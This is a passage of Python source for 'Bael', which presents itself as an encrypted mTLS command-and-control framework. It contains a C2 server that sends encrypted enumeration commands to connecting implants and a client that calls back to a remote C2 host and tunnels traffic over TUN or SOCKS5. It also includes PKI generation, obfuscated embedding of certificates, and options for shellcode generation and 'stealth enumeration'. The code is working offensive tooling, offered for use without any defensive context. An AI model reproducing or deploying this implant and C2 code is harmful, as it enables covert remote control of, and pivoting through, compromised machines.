        ctx.load_verify_locations(str(self.tmpDir / "ca.crt"))
        ctx.load_cert_chain(str(self.tmpDir / "cert.pem"), str(self.tmpDir / "key.pem"))
        ctx.verify_mode = ssl.CERT_REQUIRED
        return ctx

    def cleanup(self):
        if self.tmpDir and self.tmpDir.exists(): shutil.rmtree(self.tmpDir, ignore_errors=True)
        if self.tunFd != -1:
            try: os.close(self.tunFd)
            except: pass

    def setupTun(self, iface: str = "bael0"):
        logger.debug(f"(TUN) Establishing interface: {iface}")
        try:
            self.tunFd = os.open("/dev/net/tun", os.O_RDWR)
            ifr = struct.pack('16sH', iface.encode(), 0x0001 | 0x1000)
            fcntl.ioctl(self.tunFd, 0x400454ca, ifr)
            subprocess.run(["ip", "addr", "add", "10.8.0.2/24", "dev", iface], check=True)
            subprocess.run(["ip", "link", "set", iface, "up"], check=True)
        except Exception as e: logger.error(f"TUN Setup failed: {e}")

    async def _bridgeTUN(self, r, w, to_ssl):
        try:
            while True:
                if to_ssl:
                    data = await asyncio.get_event_loop().run_in_executor(None, os.read, self.tunFd, 2048)
                    if not data: break
                    w.write(data); await w.drain()
                else:
                    data = await r.read(32768)
                    if not data: break
                    if await self.c2.pCommand(data): continue
                    os.write(self.tunFd, data)
        except Exception as e: logger.debug(f"Bridge loop failed: {e}")

    async def spawnServer(self, lhost: str = "0.0.0.0", lport: int = 443):
        svr = await asyncio.start_server(self._clientHandle, lhost, lport, ssl=self.SSLCTX)
        logger.info(f"(C2) Listening on {lhost}:{lport}")
        
        # Start the interactive console as a background task
        asyncio.create_task(self.console.run())
        
        async with svr: await svr.serve_forever() 

    async def _clientHandle(self, r, w):
        peer = w.get_extra_info('peername')
        logger.info(f"(IMPLANT) New connection from {peer}")
        try:
            await asyncio.sleep(2.5)        # Increased again
            logger.info("[SERVER] Sending auto enumeration command...")
            initCMD = b"sysinfo:"
            enc = self.crypt.encrypt(initCMD)
            resp = SMUGGLE_MAGIC + len(enc).to_bytes(2, "big") + enc
            w.write(resp)
            await w.drain()
            logger.info(f"[-] Sent auto enumeration to {peer}")
            await asyncio.gather(self._serverToClient(w), self._clientToServer(r))
        finally:w.close()

    async def _serverToClient(self, w):
        while True:
            if self.smuggleQueue:
                try:
                    data = self.smuggleQueue.popleft()
                    w.write(data); await w.drain()
                except: break
            await asyncio.sleep(0.05)

    async def _clientToServer(self, r):
        buffer = bytearray()
        while True:
            data = await r.read(32768)
            if not data: break
            
            buffer.extend(data)
            
            while True:
                magic_idx = buffer.find(SMUGGLE_MAGIC)
                if magic_idx == -1:
                    if len(buffer) >= len(SMUGGLE_MAGIC):
                        del buffer[:len(buffer) - (len(SMUGGLE_MAGIC) - 1)]
                    break
                
                if magic_idx > 0:
                    del buffer[:magic_idx]
                
                if len(buffer) < len(SMUGGLE_MAGIC) + 2: break
                p_len = int.from_bytes(buffer[len(SMUGGLE_MAGIC):len(SMUGGLE_MAGIC)+2], "big")
                frame_end = len(SMUGGLE_MAGIC) + 2 + p_len
                if len(buffer) < frame_end: break
                
                frame = bytes(buffer[:frame_end])
                await self.c2.pCommand(frame)
                del buffer[:frame_end]
            
            # Clean up buffer if it grows too large with non-C2 data
            if len(buffer) > 65536 and SMUGGLE_MAGIC not in buffer:
                buffer.clear()

    async def connex(self,rhost:str,rport:int):
        logger.debug(f"(connex) Testing connection to {str(rhost)}:{str(rport)}")
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(5)
            o = s.connect_ex((str(rhost),int(rport)))
            logger.debug(f"(connex) errno: {str(o)}")
            return True if o == 0 else o
        except Exception as E:
            logger.error(f"(connex) Exception while attempting connection to {str(rhost)}:{str(rport)} | {str(E)}")
            return False
    
    async def spawnClient(self, rhost: str = None, rport: int = 443, socks: bool = False):
        if not rhost or rhost == "None":
            logger.error("Client failed: no remote host specified.")
            raise ValueError("No remote host specified in config")
        
        if self.args.rconnex:
            val = await self.connex(rhost, rport)
            logger.info(f"(--rconnex) Value: {str(val)}")
        
        try:
            # Client-side SSL adjustments
            ssl_ctx = self.SSLCTX
            if hasattr(ssl_ctx, 'check_hostname'):
                ssl_ctx.check_hostname = False
            
            r, w = await asyncio.open_connection(
                rhost, 
                rport, 
                ssl=ssl_ctx,
                server_hostname=None   # Important when check_hostname=False
            )
            
            logger.info(f"(CLIENT) Connected to C2: {rhost}:{rport} | mTLS: {ssl_ctx.verify_mode != ssl.CERT_NONE}")
            
            if self.config.get("socks") or socks:
                relay = SocksRelay()
                srv = await asyncio.start_server(
                    lambda sr, sw: relay.handle(sr, sw, r, w, self), 
                    '127.0.0.1', 1080
                )
                logger.info("^ SOCKS5 relay listening on 127.0.0.1:1080")
                async with srv:
                    await srv.serve_forever()
            else:
                if os.getuid() != 0:
                    raise PermissionError("TUN requires root. Use --socks.")
                self.setupTun()
                await asyncio.gather(self._bridgeTUN(r, w, True), self._bridgeTUN(r, w, False))
                
        except Exception as e:
            logger.error(f"Connection failed: {type(e).__name__}: {e}")
            raise

    async def spawn(self):
        try:
            if self.server: 
                await self.spawnServer(self.config["lhost"][0], self.config["lhost"][1])
            else: 
                await self.spawnClient(self.config["rhost"][0], self.config["rhost"][1])
        except Exception as e:
            import traceback
            logger.error(f"Engine failure: {e}")
            logger.error(traceback.format_exc())
        finally: 
            self.cleanup()

# ====================== BUILD / KEYGEN ======================
def embass(key:str,args):
    global EMBEDDED_CERTS
    if args.kg_out: kDir = Path(str(args.kg_out))
    else: kDir = Path(".baelKeys")
    logger.info(f"> Processing Directory: {str(kDir)}")
    if not kDir.exists(): return
    for f in list(kDir.glob("*.crt")) + list(kDir.glob("*.key")):
        logger.debug(f"> Processing {f.name}({len(f.read_bytes())}/bytes) | {str(key)}")
        EMBEDDED_CERTS[f.name] = BaelShield.obfuscate(f.read_bytes(), key)
    logger.info(f"Embedded {len(EMBEDDED_CERTS)} assets")

def genkeys(args):
    keysRoot = Path(args.kg_out)
    keysRoot.mkdir(exist_ok=True)
    logger.info("Generating mTLS PKI...")
    def run(cmd): subprocess.run(cmd, shell=True, check=True, capture_output=True)
    try:
        run(f'openssl req -x509 -newkey rsa:4096 -keyout {keysRoot}/ca.key -out {keysRoot}/ca.crt -days 365 -nodes -subj "/CN=BaelCA" -addext "basicConstraints=critical,CA:TRUE" -addext "keyUsage=critical,keyCertSign,cRLSign"')
        for r in ["srv", "rmt"]:
            run(f'openssl req -newkey rsa:4096 -keyout {keysRoot}/{r}.key -out {keysRoot}/{r}.csr -nodes -subj "/CN=Bael-{r}" -addext "basicConstraints=CA:FALSE" -addext "keyUsage=critical,digitalSignature,keyEncipherment"')
            # Use -copy_extensions copy to ensure CSR extensions are transferred to the signed certificate
            run(f'openssl x509 -req -in {keysRoot}/{r}.csr -CA {keysRoot}/ca.crt -CAkey {keysRoot}/ca.key -CAcreateserial -out {keysRoot}/{r}.crt -days 365 -copy_extensions copy')
        logger.info(f"Keys generated in {keysRoot}")
    except Exception as e: logger.error(f"Keygen failed: {e}")

def privkey(args):
    charset = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(charset) for _ in range(args.kg_priv))

def main():
    p = argparse.ArgumentParser(description=f"Bael v{__version__} — Encrypted mTLS C2")
    p.add_argument("--mode", choices=["tun", "server", "build", "keygen"], default="tun")
    # Build
    p.add_argument("--bl-out", default=".baelBuild")
    p.add_argument("--bl-name", default="bMTLSTUN0")
    # Keygen
    p.add_argument("--kg-out", default=".baelKeys")
    p.add_argument("--kg-priv",type=int,default=32,help="(Overides --key) Generates and uses a private key by desired length.")
    # Connections
    p.add_argument("--lhost", default="0.0.0.0:443")
    p.add_argument("--remote", type=str, help="C2 host:port")
    p.add_argument("--rconnex", action="store_true")
    # Tunnels
    p.add_argument("--socks", action="store_true")
    p.add_argument("--socks-user", help="SOCKS5 username")
    p.add_argument("--socks-pass", help="SOCKS5 password")
    # PKI / Key
    p.add_argument("--key", default="tWQLh/dj.HI/B2P#4/m#L6h/tV")
    p.add_argument("--ca-crt", default="ca.crt", help="CA certificate path")
    p.add_argument("--sv-crt", default="srv.crt", help="Server certificate")
    p.add_argument("--sv-key", default="srv.key", help="Server private key")
    p.add_argument("--rm-crt", default="rmt.crt", help="Client (remote) certificate")
    p.add_argument("--rm-key", default="rmt.key", help="Client private key")
    # Logging
    p.add_argument("--log-lvl", default="INFO", choices=["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"])
    # C2 CLI
    p.add_argument("--c2-gsc",type=str,help="Generates Shellcode based off command.")
    p.add_argument("--c2-uringenum",action="store_true",help="Demonstrates concept of io_uring-based stealth enumeration.")
    
    args = p.parse_args()
    logger.setLevel(args.log_lvl.upper())
    if args.kg_priv:
        key = privkey(args)
        logger.info("[DO NOT SHARE] <======== `%s` ========>", key)
        args.key = key
    if args.mode == "keygen":
        genkeys(args);return
    # Embed assets before build or runtime
    logger.info("Attempting to embed assets...")
    embass(args.key, args)
    if args.mode == "build":
        Bael.build(args.bl_name, buildPath=args.bl_out)
        return
    # Parse hosts
    lhost, lport = args.lhost.split(":") if ":" in args.lhost else (args.lhost, 443)
    rhost, rport = args.remote.split(":") if args.remote and ":" in args.remote else (None, 443)
    conf = {
        "mode": "s" if args.mode == "server" else "c",
        "socks": args.socks,
        "key": args.key,
        "lhost": [lhost, int(lport)],
        "rhost": [rhost, int(rport)],
        "socks_user": args.socks_user,
        "socks_pass": args.socks_pass}
    logger.debug(f"(MAIN:conf) {str(json.dumps(conf,indent=2))}")
    asyncio.run(Bael(conf, args).spawn())

if __name__ == "__main__": main()
